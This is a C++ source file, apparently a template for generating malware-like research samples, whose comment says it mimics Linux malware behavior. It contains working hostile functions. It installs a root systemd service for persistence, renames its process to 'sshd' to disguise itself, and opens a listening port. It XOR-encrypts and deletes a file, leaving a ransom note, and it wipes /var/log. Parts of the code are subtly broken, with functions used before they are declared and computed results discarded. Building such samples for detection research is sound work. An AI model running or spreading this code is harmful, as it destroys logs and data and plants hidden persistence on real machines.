#include <iostream>
#include <unistd.h>
#include <fstream>
#include <ctime>
#include <random>
#include <chrono>
#include <thread>
#include <filesystem>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
using namespace std;

/* 
This program is designed to perform a simple sequence of actions meant to mimic malicious program behavior.
Based on survey of Linux malware behavior from Cozzi et. al.
*/

// establishes persistance by creating a service script
void createService(){
   std::filesystem::path currentPath = std::filesystem::current_path();

   ofstream serviceFile("/etc/systemd/system/virus.service");
   std::string partOne = "[Unit]\nDescription=My Custom Program\nAfter=network.target\n\n[Service]\nExecStart=";
   std::string partTwo = "/virus\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n";
   // write out ransom text
   serviceFile << partOne << currentPath.string() << partTwo;
   serviceFile.close();

   const char *serviceCommand = "sudo systemctl enable virus.service && sudo systemctl start virus.service";

   int exitCode = system(serviceCommand);

   if (exitCode == 0) {
      printf("Service enabled and started successfully.\n");
   } else {
      printf("Error enabling or starting the service.\n");
   }
}

// deception tactic, invoke prctl to change process name in memory to 'sshd'
int changeProcName() {
   char procName[] = "sshd";
   return prctl(PR_SET_NAME, &procName);
}

// opens a port on the system
void openPort(){
   pid_t childPid;

   childPid = fork();
   if (childPid == 0) {
      // open port
      int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
      if (serverSocket == -1) {
        std::cerr << "Error creating socket" << std::endl;
      }

      // Bind the socket to an address and port
      struct sockaddr_in serverAddress;
      serverAddress.sin_family = AF_INET;
      serverAddress.sin_addr.s_addr = INADDR_ANY;
      serverAddress.sin_port = htons(9999); // Port number

      if (bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == -1) {
         std::cerr << "Error binding socket" << std::endl;
         close(serverSocket);
      }
      close(serverSocket);
   }

}

// create an encryption key, set up stream cipher, create new file and write encrypted data, delete original
// looks for the file "important.txt" in the current dir.
void ransomFiles(){

   // read in important.txt file
   std::ifstream input("important.txt", std::ios::binary);
   if (!input) {
      std::cerr << "Failed to open the file." << std::endl;
   }

   // create empty file and write out encrypted data using simple xor encryption
   ofstream output("enc.txt");
   output.open("enc.txt");

   char byte;
   int encKey = genKey();

   while (input.read(&byte, 1)) {
      output << (static_cast<int>(byte) ^ encKey); // XOR each byte from original file with enc key
   }
   output.close();
   input.close();

   // delete important .txt
   std::filesystem::remove("important.txt");
   writeNote(encKey);
}

// write out 'ransom' note which includes encryption key
void writeNote(int encKey){
   // create file ransom.txt
   ofstream ransomFile("ransom.txt");
   // write out ransom text
   ransomFile << "The file \'important.txt\' has been encrypted with a key of " << encKey << std::endl;

   ransomFile.close();
}


// deletes logging
void clearLogs() {
   // make system call to rm -rf var/log files.
   std::filesystem::remove_all("/var/log");
}

int genKey() {
   std::mt19937 rng(std::time(nullptr)); // Initialize random number generator with current time as seed
   std::uniform_int_distribution<unsigned int> distribution(0, 255); // Range of possible byte values
   unsigned int randomByte = distribution(rng);
   return randomByte;
}

// open a file and copy the contents
void readFile() {
   std::ifstream input("important.txt");
   if (!input) {
      std::cerr << "Failed to open the file." << std::endl;
   }
   input.close();
}

void writeFile() {
   std::ofstream output("random.txt");
   if (!output) {
      std::cerr << "Failed to open the file." << std::endl;
   }
   output << "This is some random text that the program has written to a file" << std::endl;
   output.close();
}

void deleteFile() {
   std::filesystem::remove("random.txt");
}

// function to wait for a predefined amount of time
void wait(int time){
   std::this_thread::sleep_for(std::chrono::seconds(time));
}


// perform random mathmatical operations
void math(){
   // generate two random, nonzero numbers
   int a = rand();
   int b = rand();

   int choice = (rand() % 5) + 1;

   // randomly choose one of five operations
   switch (choice)
   {
   case 1: // addition
      a + b;
      break;
   case 2: // subtraction
      a - b;
      break;
   case 3: // multiplication
      a * b;
      break;
   case 4: // division
      if (b != 0){
         a / b;
      }
      break;
   case 5: // modulous
      if (b != 0){
         a % b;
      }
      break;
   default:
      break;
   }

} 

// main function added by generator